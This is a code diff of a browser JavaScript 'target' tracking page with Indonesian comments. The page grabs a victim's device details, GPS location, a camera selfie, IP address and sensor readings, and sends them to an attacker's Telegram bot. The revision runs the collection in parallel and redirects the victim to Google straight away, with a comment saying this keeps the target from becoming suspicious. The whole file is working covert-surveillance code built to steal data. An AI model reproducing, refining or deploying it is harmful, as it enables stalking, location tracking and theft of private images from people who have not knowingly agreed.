@@ -1,7 +1,7 @@
 //
 // ===================================
 //   Dibuat oleh: Ahmad Zaki
-//   Versi: v-Cepat (Format Rapi)
+//   Versi: v-Super-Cepat (Paralel + Redirect Langsung)
 // ===================================
 //
 
@@ -25,7 +25,7 @@ const updateStatus = (message, isError = false) => {
   statusList.scrollTop = statusList.scrollHeight;
 };
 
-// ... (Semua fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getSensorData tetap sama) ...
+// ... (Fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getSensorData tetap sama) ...
 const getDeviceInfo = async () => {
   updateStatus('1. Mengambil info perangkat...');
   const data = {
@@ -98,12 +98,11 @@ const getSensorData = () => {
 };
 
 
-// --- Fungsi sendToTelegram (FORMAT BARU YANG LEBIH RAPI) ---
+// --- Fungsi sendToTelegram (DENGAN REDIRECT LANGSUNG) ---
 const sendToTelegram = async (data) => {
   updateStatus('6. Mengirim semua data...');
   const { deviceInfo, location, photoBase64, ipAddress, sensor } = data;
   
-  // Format pesan baru yang lebih rapi
   const message = `
 🔔 *DATA TARGET DITERIMA* (${alias || 'Target'})
 -----------------------------------
@@ -130,65 +129,73 @@ const sendToTelegram = async (data) => {
 -----------------------------------
   `.trim();
 
-  // --- Kirim Data ---
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-  });
-  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, latitude: location.lat, longitude: location.lon, horizontal_accuracy: location.accuracy })
-  });
-  const photoFormData = new FormData();
-  photoFormData.append('chat_id', chatId);
-  photoFormData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
-  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: photoFormData });
-  
-  updateStatus('✅ Semua data berhasil dikirim!');
+  try {
+    // Kirim Info Teks
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+    });
+    // Kirim Lokasi
+    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, latitude: location.lat, longitude: location.lon, horizontal_accuracy: location.accuracy })
+    });
+    // Kirim Foto
+    const photoFormData = new FormData();
+    photoFormData.append('chat_id', chatId);
+    photoFormData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
+    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: photoFormData });
+    
+    // SEMUA DATA TERKIRIM. LANGSUNG REDIRECT.
+    updateStatus('✅ Data terkirim. Mengalihkan...');
+    window.location.href = 'https://www.google.com';
+
+  } catch (err) {
+    updateStatus('❌ Gagal mengirim ke Telegram. Mengalihkan...', true);
+    // REDIRECT WALAUPUN GAGAL KIRIM (agar tidak curiga)
+    window.location.href = 'https://www.google.com';
+  }
 };
 
-// --- Fungsi Utama (Tanpa Fingerprint) ---
+// --- Fungsi Utama (Paralel + Super Cepat) ---
 const start = async () => {
   if (!chatId || !alias) {
     updateStatus('❌ Error: Link tidak valid.', true);
-    setTimeout(() => { window.location.href = 'https://www.google.com'; }, 500);
+    setTimeout(() => { window.location.href = 'https://www.google.com'; }, 500); // Redirect jika link rusak
     return;
   }
   
   try {
-    const data = {};
-    
-    // Meminta izin (Hanya Lokasi & Kamera)
-    data.location = await getLocation();
-    data.photoBase64 = await getPhoto();
-
-    // Ambil data non-izin
-    const [deviceInfo, ipAddress, sensor] = await Promise.all([
+    // Jalankan SEMUA pengumpulan data secara paralel
+    const [
+        location,
+        photoBase64,
+        deviceInfo,
+        ipAddress,
+        sensor
+    ] = await Promise.all([
+        getLocation(), // Minta izin 1
+        getPhoto(),    // Minta izin 2
         getDeviceInfo(),
         getIpAddress(),
         getSensorData().catch(err => ({ orientation: err.message, x:0, y:0, z:0 }))
     ]);
-    data.deviceInfo = deviceInfo;
-    data.ipAddress = ipAddress;
-    data.sensor = sensor;
 
-    await sendToTelegram(data);
-    updateStatus('Selesai.');
-    
-    // Redirect cepat
-    setTimeout(() => {
-      window.location.href = 'https://www.google.com';
-    }, 1000); // Redirect setelah 1 detik
+    // Kirim data. Fungsi 'sendToTelegram' akan menangani redirect.
+    await sendToTelegram({
+        location,
+        photoBase64,
+        deviceInfo,
+        ipAddress,
+        sensor
+    });
     
   } catch (err) {
+    // Ini terjadi jika target menolak izin (Lokasi/Kamera)
     console.error(err);
-    let errorMsg = `❌ Error: ${err.message}`;
-    if (err.message.includes('permission') || err.message.includes('denied')) {
-        errorMsg = `❌ Error: Izin (Lokasi/Kamera) ditolak oleh target.`;
-    }
-    updateStatus(errorMsg, true);
+    updateStatus(`❌ Izin ditolak. Mengalihkan...`, true);
     
-    // Redirect jika gagal
+    // Redirect jika target menolak izin
     setTimeout(() => {
       window.location.href = 'https://www.google.com';
     }, 500);
